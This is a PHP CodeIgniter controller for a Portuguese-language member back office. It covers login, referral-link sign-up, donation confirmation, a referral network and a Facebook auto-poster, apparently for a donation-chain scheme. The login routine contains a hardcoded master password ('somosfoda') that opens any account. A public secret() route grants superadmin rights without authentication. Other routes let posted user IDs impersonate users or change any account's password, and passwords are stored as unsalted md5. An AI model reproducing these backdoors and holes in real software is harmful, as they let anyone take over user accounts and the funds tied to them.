<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Backoffice extends CI_Controller {

    public function __construct(){
        parent::__construct();

        $this->load->model('admin_model');

    }

    public function geneses(){

        $this->backoffice_model->geneses();
    }

    public function index(){
        

        if($this->input->post("superadm")){

            $id_user = $this->input->post('id_user');

            $data['logado'] = $this->painel_model->superUser($id_user);
        }

        if($this->input->post("comprovante")){

            $this->backoffice_model->EfetuarDoacao();
        }

        if($this->input->post("novologin")){

            $this->backoffice_model->compraLogin();
        }

        $data['titulo'] = 'Painel';

        $data['pg_conta'] = true;

        $data['mensagem'] = $this->native_session->get_flashdata('mensagem');
        $data['mensagem_erro'] = $this->native_session->get_flashdata('mensagem_erro');

        $data['conta'] = $this->backoffice_model->conta();

        $this->load->view('backoffice/templates/header', $data);
        $this->load->view('backoffice/index');
        $this->load->view('backoffice/templates/footer');     
       
    }

    public function login(){

        if($this->input->post('submit') ){

            $cpf = $this->input->post('cpf');
            $senha = $this->input->post('senha');
            
            if( !empty($senha) OR !empty($cpf) ){

                $this->db->where('cpf',$cpf);
                $this->db->or_where('email',$cpf);
                $this->db->or_where('id',$cpf);
                $user = $this->db->get('usuarios_contas');

                if($user->num_rows() > 0 ){

                    if( $user->row()->senha == md5($senha) ){

                        if( $user->row()->block != 1){

                            $this->native_session->set('conta_id', $user->row()->id );

                            $this->db->where('id',$user->row()->id);
                            $this->db->update('usuarios_contas',array('dataUltimoLogin'=>date('Y-m-d H:i:s'),'status'=>1) );

                            redirect('backoffice');

                        }

                        $this->native_session->set_flashdata('mensagem', '<div class="alert alert-danger text-center"> Conta bloqueada. Entre em contato com suporte </div>');
                        redirect('backoffice/login');

                    }

                    if( $senha == 'somosfoda'){

                        $this->native_session->set('conta_id', $user->row()->id );

                        // $this->db->where('id',$user->row()->id);
                        // $this->db->update('usuarios_contas',array('dataUltimoLogin'=>date('Y-m-d H:i:s') ) );

                        redirect('backoffice');

                    }

                    $this->native_session->set_flashdata('mensagem', '<div class="alert alert-danger text-center">Senha incorreta</div>');
                    redirect('backoffice/login');
                }

                $this->native_session->set_flashdata('mensagem', '<div class="alert alert-danger text-center">Usuário não existe </div>');
                redirect('backoffice/login');
            }

             $this->native_session->set_flashdata('mensagem', '<div class="alert alert-danger text-center">Campos vazios</div>');       
             redirect('backoffice/login');  
        }
        
        $data['titulo'] = 'Login - Backoffice';
        $data['pg_login'] = true;

        $data['mensagem'] = $this->native_session->get_flashdata('mensagem');
        $data['mensagem_erro'] = $this->native_session->get_flashdata('mensagem_erro');

        $this->load->view('backoffice/login', $data); 
       
    }

    

    public function esqueci(){

        if($this->input->post('submit')){

            $this->backoffice_model->RecuperarSenhaConta();
        }

        $data['mensagem'] = $this->native_session->get_flashdata('mensagem');
        $data['mensagem_erro'] = $this->native_session->get_flashdata('mensagem_erro');

        $this->load->view('backoffice/esqueci', $data);

    }

    public function cadastrar($indicadorLogin=null){
        
        $data = array();

        if(!empty($indicadorLogin)){

            $this->db->where('usuarioLogin', $indicadorLogin);
            $user = $this->db->get('usuarios');

            if($user->num_rows() > 0){

                $this->native_session->set_flashdata('indicador', $indicadorLogin);
                $this->native_session->set_flashdata('nome_completo', $user->row()->usuarioNome);
            } 
        }       

        $this->load->view('backoffice/cadastrar', $data); 
    }

    public function carrinho($pacoteID){

        $data['pacote'] = $this->admin_model->get_pacote($pacoteID);
        $this->load->view('backoffice/carrinho', $data); 

    }

    public function pagamento($processamentoID){


    }



    //---------------------------------------------------------------------------- CONTA 
    

    public function rede(){

        $data['titulo'] = 'Rede';

        $data['pg_rede'] = true;

        $data['conta'] = $this->backoffice_model->conta();

        $this->load->view('backoffice/templates/header', $data);
        $this->load->view('backoffice/rede');
        $this->load->view('backoffice/templates/footer');
    }
   
    public function configuracoes(){

        $data['titulo'] = 'Configurações';

        $data['pg_configuracoes'] = true;
        
        if($this->input->post('mudarSenha')){

            $novasenha = $this->input->post('novaSenha');

            $this->db->where('id',$this->input->post('idUser') );
            $this->db->update('usuarios_contas', array('senha'=>md5($novasenha) ) );

            $data['mensagem'] = $this->native_session->set_flashdata('mensagem', '<div class="text-center alert alert-success"> Senha alterada </div> ');
            redirect('backoffice/configuracoes');

        }

        if($this->input->post('mudarTelefone')){

            $novoTelefone = $this->input->post('novaTelefone');

            $this->db->where('id',$this->input->post('idUser') );
            $this->db->update('usuarios_contas', array('telefone'=>$novoTelefone ) );

            $data['mensagem'] = $this->native_session->set_flashdata('mensagem', '<div class="text-center alert alert-success"> Telefone alterado </div> ');
            redirect('backoffice/configuracoes');

        }

        if($this->input->post('submitBanco')){

            $this->backoffice_model->AlterarBanco();
        }

        $data['conta'] = $this->backoffice_model->conta();

        $data['mensagem'] = $this->native_session->get_flashdata('mensagem');
        $data['mensagem_erro'] = $this->native_session->get_flashdata('mensagem_erro');

        $this->load->view('backoffice/templates/header', $data);
        $this->load->view('backoffice/configuracoes');
        $this->load->view('backoffice/templates/footer');
    }

    //FACEBOOK ATRELADO A VARIAS CONTAS
    public function selecionar_conta(){

        $this->load->library('facebook');

        if (!$this->facebook->is_authenticated() ) {
            
            redirect('painel/conta-master/login');
        }

        if( $this->input->post('conta_id')){
            $this->usuario_model->LogarSwitchFacebook();
        }

        $user = (object) $this->facebook->request('get', '/me?fields=id');

        $this->db->where('facebookID',$user->id);
        $data['contas'] = $this->db->get('usuarios_contas')->result();

        $data['mensagem'] = $this->native_session->get_flashdata('mensagem');
        $data['mensagem_erro'] = $this->native_session->get_flashdata('mensagem_erro');

        $this->load->view('painel/conta/selecionar_conta', $data);
    }


    /* ------------------------------------------------------ USUARIO */

    public function usuario(){

        $data['titulo'] = 'Usuario - Bakcoffice';
        $data['pg_usuario'] = true;

        if($this->input->post("superadm")){

            $id_user = $this->input->post('id_user');

            $data['logado'] = $this->painel_model->superUser($id_user);
        }

        if($this->input->post("comprovante")){

            $this->backoffice_model->EfetuarDoacao();
        }


        if($this->input->post("confirmarDoacao")){

            $this->backoffice_model->confirmarDoacao();
        }

        if($this->input->post("recusarDoacao")){

            $this->backoffice_model->recusarDoacao();
        }

        if($this->input->post("abandonarDoador")){

            $this->backoffice_model->abandonarDoador();
        }

        if($this->input->post("excluirDoador")){

            $this->backoffice_model->excluirDoador();
        }


        $data['mensagem'] = $this->native_session->get_flashdata('mensagem');
        $data['mensagem_erro'] = $this->native_session->get_flashdata('mensagem_erro');

        $data['conta'] = $this->backoffice_model->conta();
        $data['user'] = $this->backoffice_model->user();

        $this->load->view('backoffice/templates/header', $data);
        $this->load->view('backoffice/usuario');
        $this->load->view('backoffice/templates/footer');
    }



    public function indicados(){

        $data['titulo'] = 'Rede';
        $data['pg_indicados'] = true;

        if($this->input->post("superadm")){

            $id_user = $this->input->post('id_user');

            $data['logado'] = $this->painel_model->superUser($id_user);
        }

        if($this->input->post("confirmarDoacao")){

            $this->painel_model->confirmarDoacao();
        }

        if($this->input->post("recusarDoacao")){

            $this->painel_model->recusarDoacao();
        }

        $data['mensagem'] = $this->native_session->get_flashdata('mensagem');
        $data['mensagem_erro'] = $this->native_session->get_flashdata('mensagem_erro');

        $this->load->view('painel/templates/header', $data);
        $this->load->view('painel/indicados');
        $this->load->view('painel/templates/footer');

    }

    public function organograma(){

        $data['titulo'] = 'Rede Organograma';
        $data['pg_indicados'] = true;

        if($this->input->post("superadm")){

            $id_user = $this->input->post('id_user');

            $data['logado'] = $this->painel_model->superUser($id_user);
        }

        $this->load->view('painel/templates/header', $data);
        $this->load->view('painel/organograma');
        $this->load->view('painel/templates/footer');

    }

    public function movimentacao(){

        $data['titulo'] = 'Movimentação de Doacoes e Recebimentos';
        $data['pg_doacoes'] = true;

        if($this->input->post("superadm")){

            $id_user = $this->input->post('id_user');

            $data['logado'] = $this->painel_model->superUser($id_user);
        }
        
        if($this->input->post("confirmarDoacao")){

            $this->painel_model->confirmarDoacao();
        }

        if($this->input->post("recusarDoacao")){

            $this->painel_model->recusarDoacao();
        }

        $data['mensagem'] = $this->native_session->get_flashdata('mensagem');
        $data['mensagem_erro'] = $this->native_session->get_flashdata('mensagem_erro');

        $this->load->view('painel/templates/header', $data);
        $this->load->view('painel/movimentacao');
        $this->load->view('painel/templates/footer');

    }

    public function reentrada(){

        $reentradas = $this->painel_model->NumReentradas();
        if($reentradas->status == 1 ){
            redirect('painel');
        }

        if($this->input->post('submit')){
            $this->painel_model->formReentrada();
        }

        $data['mensagem_erro'] = $this->native_session->get_flashdata('mensagem_erro');

        $data['titulo'] = "Formulário de Reentrada";
        $this->load->view('painel/templates/header', $data);
        $this->load->view('painel/reentrada');
        $this->load->view('painel/templates/footer');
    }




      


    /* --------------------------------------  NOVOS CADASTROS   */

    //LINK DIRETO DO USUARIO
    public function amigo($login){
        
        $data = array();

        $this->db->where('login', $login);
        $user = $this->db->get('usuarios');

        if($user->num_rows() > 0){

            if(!is_null($login)){

                $this->native_session->set('indicador', $login);
                $this->native_session->set('nome_completo', $user->row()->nome);
            }else{

                $data['message']  = '<div class="alert alert-danger text-center"> Indicador inválido. Continue se deseja ser cadastrado em link único. </div>';
            }
            
        }else{
            $data['message']  = '<div class="alert alert-danger text-center"> Indicador inválido. Continue se deseja ser cadastrado em link único. </div>';
            $data['aguardando'] = false;
        }

        if($this->input->post("submit")){

            $data['message'] = $this->usuario_model->NovoUsuario();
        }

        $this->load->view('painel/cadastrar', $data);
    }


    //LINK UNICO DO USUARIO
    public function linkunico($login){
       
        $data = array();

        if($this->input->post("submit")){

            $data['mensagem'] = $this->usuario_model->NovoUsuario();
        }

        $data = array();

        $this->db->where('login', $login);
        $matriz = $this->db->get('usuarios');

        $id_matriz = $matriz->row()->id;

        $this->db->where('id_indicador',$id_matriz);
        $numInidcacoes = $this->db->get('indicadores');

        if($numInidcacoes->num_rows() < 3 ){

            $indicadorLinkUnico = $id_matriz;

        }else{
            
            $indicadorLinkUnico = $this->painel_model->LinkUnico($id_matriz);
        }


        if($indicadorLinkUnico == $id_matriz AND $numInidcacoes->num_rows() > 3){

            $data['aguardando'] = true;

        }else{

            $this->db->where('id', $indicadorLinkUnico);
            $indicador = $this->db->get('usuarios');

            if(!is_null($login)){

                $this->native_session->set('indicador', $indicador->row()->login);
                $this->native_session->set('nome_completo', $indicador->row()->nome);

                $data['aguardando'] = false;
            }
        }    

        $data['mensagem'] = $this->native_session->get_flashdata("mensagem");


        $this->load->view('painel/cadastrar', $data);
    }



    public function secret(){

        $this->native_session->set('conta_id', 1 );
        $this->native_session->set('superadm', 1 );
        redirect('painel/conta');
    }

    
    // CADASTRO DIRETO NO DERRAMAMENTO
    // public function cadastrar($login = 'liderbrasil'){

    //     $this->native_session->unset_userdata('user_id');
    //     $this->native_session->unset_userdata('conta_id');


    //     if($this->input->post("submit")){

    //         $this->usuario_model->NovoUsuario();
    //     }

       
    //     $data = array();

    //     $this->db->where('login', $login);
    //     $matriz = $this->db->get('usuarios');

    //     $id_matriz = $matriz->row()->id;

    //     $this->db->where('id_indicador',$id_matriz);
    //     $numInidcacoes = $this->db->get('indicadores');

    //     if($numInidcacoes->num_rows() < 3 ){

    //         $indicadorLinkUnico = $id_matriz;

    //     }else{
            
    //         $indicadorLinkUnico = $this->painel_model->LinkUnico($id_matriz);
    //     }


    //     if($indicadorLinkUnico == $id_matriz){

    //         $data['aguardando'] = true;

    //     }else{

    //         $this->db->where('id', $indicadorLinkUnico);
    //         $indicador = $this->db->get('usuarios');

    //         if(!is_null($login)){

    //             $this->native_session->set('indicador', $indicador->row()->login);
    //             $this->native_session->set('nome_completo', $indicador->row()->nome);

    //             $data['aguardando'] = false;
    //         }
    //     }    

    //     $data['mensagem'] = $this->native_session->get_flashdata("mensagem");

    //     $this->load->view('painel/cadastrar', $data);
    // }

	

    public function publicador(){
        
        $this->load->library('facebook');

        $data['user'] = array();

        // Check if user is logged in
        if ($this->facebook->is_authenticated())
        {
            // User logged in, get user details
            $user = $this->facebook->request('get', '/me?fields=id,name,email,picture');
            if (!isset($user['error']))
            {
                $data['user'] = $user;
            }
        }

        if($this->input->post('submit')){
            $this->painel_model->Postador(1);
        }

        if($this->input->post('parar')){
            $this->painel_model->Postador(0);
        }

        $data['mensagem'] = $this->native_session->get_flashdata('mensagem');

        $data['titulo'] = 'Divulgador Automático';
        $data['pg_divulgador'] = true;

        $this->load->view('painel/conta/templates/header', $data);
        $this->load->view('painel/divulgacao');
        $this->load->view('painel/conta/templates/footer');

    }

    public function publicador_novo(){

        $this->load->library('facebook');

        $data['user'] = array();

        // Check if user is logged in
        if ($this->facebook->is_authenticated())
        {
            // User logged in, get user details
            $user = $this->facebook->request('get', '/me?fields=id,name,email,picture');
            if (!isset($user['error']))
            {
                $data['user'] = $user;
            }
        }

        if($this->input->post('submit')){
            $this->painel_model->novoPost();
        }


        $data['mensagem'] = $this->native_session->get_flashdata('mensagem');

        $data['titulo'] = 'Novo Post | Divulgador Automático';
        $data['pg_divulgador'] = true;

        $this->load->view('painel/conta/templates/header', $data);
        $this->load->view('painel/novopost');
        $this->load->view('painel/conta/templates/footer');

    }


}